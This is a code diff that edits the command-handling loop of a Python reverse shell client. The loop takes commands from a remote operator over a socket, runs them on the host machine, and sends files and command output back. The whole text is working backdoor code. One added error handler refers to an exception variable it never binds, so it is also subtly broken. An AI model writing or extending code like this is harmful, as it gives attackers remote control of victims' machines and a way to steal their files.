@@ -179,12 +179,13 @@ class ReverseShellClient:
     
     def handle_connection(self):
         while self.alive:
+            output = None
             try:
                 cmd = self.comm.recv().decode().strip()
                 print("Received command:", cmd)  
                 
-                if not cmd.strip():
-                    return b"Empty command" 
+                if cmd == None or not cmd:
+                    output = b"Client msg: Empty command received. No action." 
                 if cmd.startswith("cd"):
                     path = cmd[3:]
                     output = self.change_directory(path)
@@ -192,7 +193,8 @@ class ReverseShellClient:
                     output = self.get_ip_info()
                 elif cmd.lower().startswith("download"):
                     local_path = cmd[9:].strip()
-                    output = self.upload_file(local_path)
+                    self.upload_file(local_path)
+                    continue
                 elif cmd.lower().startswith("upload"):
                     remote_path = cmd[7:].strip()
                     output = self.download_file(remote_path)
@@ -202,13 +204,17 @@ class ReverseShellClient:
                 else:
                     output = self.run_command(cmd)
                 
-                self.comm.send(output)
+                if output is not None:
+                    self.comm.send(output)
             
             except (socket.error, KeyboardInterrupt):
+                print(f"Connection error: {e}")
                 self.kill_connection()
                 break
             except Exception as e:
-                self.comm.send(f"Unhandled error: {e}".encode())
+                print(f"Output failed: {e}")
+                e_msg = f"Client output error: {e}"
+                self.comm.send(e_msg.encode('utf-8'))
 
 def main():
     try:
